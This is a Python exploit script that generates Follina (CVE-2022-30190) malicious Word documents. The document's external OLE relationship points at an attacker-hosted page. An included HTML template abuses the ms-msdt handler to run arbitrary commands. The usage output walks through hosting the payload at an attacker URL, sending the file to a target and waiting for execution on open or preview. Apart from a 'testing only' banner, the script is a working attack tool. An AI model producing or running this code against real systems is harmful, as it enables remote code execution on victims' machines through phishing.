#!/usr/bin/env python3
"""
Follina (CVE-2022-30190) Malicious Document Generator
Generates documents that exploit MSDT vulnerability
FOR AUTHORIZED SECURITY TESTING ONLY
"""
import sys
import os
import base64
import zipfile
from io import BytesIO

HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
<script>
location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebsrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(COMMAND)/.telerik\\"";
</script>
</head>
<body>
</body>
</html>'''

def create_malicious_docx(output_path, payload_url):
    """Create a malicious docx that exploits Follina"""

    # Create minimal docx structure
    docx = BytesIO()

    with zipfile.ZipFile(docx, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Content Types
        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''
        zf.writestr('[Content_Types].xml', content_types)

        # Main rels
        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>'''
        zf.writestr('_rels/.rels', rels)

        # Document with OLE object reference
        document = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
            xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:body>
    <w:p>
      <w:r>
        <w:t>Loading external content...</w:t>
      </w:r>
    </w:p>
  </w:body>
</w:document>'''
        zf.writestr('word/document.xml', document)

        # Document rels with external target
        doc_rels = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
                Target="{payload_url}!" TargetMode="External"/>
</Relationships>'''
        zf.writestr('word/_rels/document.xml.rels', doc_rels)

    # Write to file
    with open(output_path, 'wb') as f:
        f.write(docx.getvalue())

    print(f"[+] Malicious document created: {output_path}")
    print(f"[*] Document references: {payload_url}")

def main():
    print("=" * 60)
    print("Follina (CVE-2022-30190) Document Generator")
    print("FOR AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 60)

    if len(sys.argv) < 3:
        print(f"\nUsage: {sys.argv[0]} <output.docx> <payload_url>")
        print("Example: python3 follina.py evil.docx http://attacker/payload.html")
        sys.exit(1)

    output = sys.argv[1]
    payload_url = sys.argv[2]

    create_malicious_docx(output, payload_url)

    print("\n[*] To use:")
    print(f"    1. Host payload HTML at {payload_url}")
    print(f"    2. Send {output} to target")
    print("    3. Wait for execution when document is opened/previewed")

if __name__ == "__main__":
    main()
